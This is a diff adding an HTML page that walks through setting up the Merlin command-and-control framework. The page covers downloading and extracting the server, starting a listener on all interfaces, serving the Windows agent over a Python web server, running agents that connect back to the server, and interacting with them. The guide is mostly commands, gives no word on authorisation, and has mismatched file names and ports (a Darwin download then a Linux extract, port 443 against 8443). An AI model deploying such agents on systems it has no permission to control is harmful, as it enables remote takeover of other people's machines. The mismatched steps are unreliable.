@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Merlin C2 Framework Setup and Usage Guide</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        header {
+            background: #333;
+            color: #fff;
+            padding: 1rem 0;
+            text-align: center;
+        }
+        header h1 {
+            margin: 0;
+            font-size: 2rem;
+        }
+        main {
+            max-width: 800px;
+            margin: 2rem auto;
+            padding: 1rem;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        h2 {
+            color: #007BFF;
+        }
+        pre {
+            background: #f8f9fa;
+            padding: 1rem;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-family: monospace;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+        }
+        ul {
+            padding-left: 1.5rem;
+        }
+        li {
+            margin-bottom: 0.5rem;
+        }
+        footer {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Merlin C2 Framework Setup and Usage Guide</h1>
+    </header>
+    <main>
+        <p>This guide provides a step-by-step methodology for downloading, installing, configuring, and using the Merlin C2 framework. By following this documentation, you will be able to set up and run the Merlin Server, configure listeners, deploy agents, and interact with them effectively.</p>
+
+        <hr>
+
+        <h2>Step 1: Downloading and Extracting Merlin C2</h2>
+        <ol>
+            <li><strong>Download the Latest Version of Merlin:</strong>
+                <ul>
+                    <li>Go to the <a href="https://github.com/Ne0nd0g/merlin/releases" target="_blank">Merlin GitHub Releases Page</a> to download the latest version of the framework.</li>
+                    <li>Use the following <code>wget</code> command to download the server file:
+                        <pre><code>wget https://github.com/Ne0nd0g/merlin/releases/download/v2.1.3/merlinServer-Darwin-x64.7z</code></pre>
+                    </li>
+                </ul>
+            </li>
+            <li><strong>Extract the Compressed File:</strong>
+                <ul>
+                    <li>After the file has been downloaded, extract it using the <code>7z</code> tool.</li>
+                    <li>Use the following command to extract the file:
+                        <pre><code>7z x merlinServer-Linux-x64-v2.1.3.7z</code></pre>
+                    </li>
+                    <li>Note: The extracted files are password protected. The password for extraction is <strong>merlin</strong>.</li>
+                </ul>
+            </li>
+        </ol>
+
+        <hr>
+
+        <h2>Step 2: Running the Merlin Server</h2>
+        <ol>
+            <li><strong>Start the Merlin Server:</strong>
+                <ul>
+                    <li>Navigate to the folder where the server has been extracted and run the server:
+                        <pre><code>./&lt;name_of_server_file&gt;</code></pre>
+                        Example:
+                        <pre><code>./merlinServer</code></pre>
+                    </li>
+                </ul>
+            </li>
+            <li><strong>Server is Running:</strong>
+                <ul>
+                    <li>Navigate to the directory <code>/data/bin</code> to access the compiled Merlin CLI and Agent files:
+                        <pre><code>cd /data/bin</code></pre>
+                    </li>
+                </ul>
+            </li>
+            <li><strong>Start the Merlin CLI:</strong>
+                <ul>
+                    <li>Run the CLI in the <code>/data/bin</code> directory:
+                        <pre><code>./merlinCLI</code></pre>
+                    </li>
+                </ul>
+            </li>
+        </ol>
+
+        <h3>Start the Listeners</h3>
+        <ul>
+            <li>With the CLI running, initiate the listeners:
+                <pre><code>listeners</code></pre>
+            </li>
+            <li>To configure Merlin to listen on all IPs, execute:
+                <pre><code>set Interface 0.0.0.0
+set port 8443
+start
+show</code></pre>
+            </li>
+        </ul>
+
+        <hr>
+
+        <h2>Step 3: Running the Merlin Agent</h2>
+
+        <h3>On Kali Linux</h3>
+        <ul>
+            <li>Run the Merlin agent with the default URL pointing to the server:
+                <pre><code>./merlinAgent -url http://127.0.0.1:443</code></pre>
+            </li>
+        </ul>
+
+        <h3>On Windows</h3>
+        <ul>
+            <li>Send the Windows agent to the Windows machine.</li>
+            <li>Use a Python server to share the Windows agent:
+                <pre><code>python3 -m http.server {port no}</code></pre>
+            </li>
+            <li>Access the server from the Windows browser, download the agent, and run it:
+                <pre><code>.<windowsmerlinagentname> -url https://&lt;server_ip&gt;:&lt;port&gt;</code></pre>
+            </li>
+        </ul>
+
+        <hr>
+
+        <h2>Step 4: Interacting with the Agents</h2>
+        <ol>
+            <li><strong>Interacting with an Agent:</strong>
+                <ul>
+                    <li>Use the <code>interact</code> command followed by the agent's ID:
+                        <pre><code>interact &lt;agent_id&gt;</code></pre>
+                    </li>
+                </ul>
+            </li>
+            <li><strong>Available Commands:</strong>
+                <ul>
+                    <li>After connecting to an agent, type <code>help</code> to see the list of commands.</li>
+                </ul>
+            </li>
+        </ol>
+
+        <p>Ensure that you follow each step carefully and verify your setup at each stage to avoid any issues.</p>
+    </main>
+    <footer>
+        <p>&copy; 2024 Your Website | Merlin C2 Guide</p>
+    </footer>
+</body>
+</html>
